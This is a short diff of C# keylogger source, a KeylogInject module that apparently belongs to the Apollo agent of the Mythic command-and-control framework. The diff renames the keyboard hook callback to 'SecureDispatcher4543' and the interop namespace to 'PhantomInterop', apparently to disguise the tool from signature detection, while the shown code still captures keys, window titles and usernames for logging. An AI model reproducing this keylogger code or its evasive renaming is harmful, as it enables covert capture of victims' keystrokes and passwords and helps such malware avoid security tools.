@@ -17,7 +17,7 @@ namespace KeylogInject
         private static string lastTitle = "";
         public static PushKeylog LogMessage;
 
-        public static IntPtr HookCallback(Int32 code, IntPtr wParam, IntPtr lParam)
+        public static IntPtr SecureDispatcher4543(Int32 code, IntPtr wParam, IntPtr lParam)
         {
             try
             {
@@ -387,14 +387,14 @@ namespace KeylogInject
                                 }
                             }
                         }
-                        if (!string.IsNullOrEmpty(key))
+                        if (!ValidationHelper.IsStringEmpty(key))
                         {
                             StringBuilder title = new StringBuilder(256);
                             if (hWindow != IntPtr.Zero)
                                 GetWindowText(hWindow, title, title.Capacity);
                         
 
-                            LogMessage(new ApolloInterop.Structs.MythicStructs.KeylogInformation
+                            LogMessage(new PhantomInterop.Structs.MythicStructs.KeylogInformation
                             {
                                 Username = Username,
                                 WindowTitle = title.ToString(),
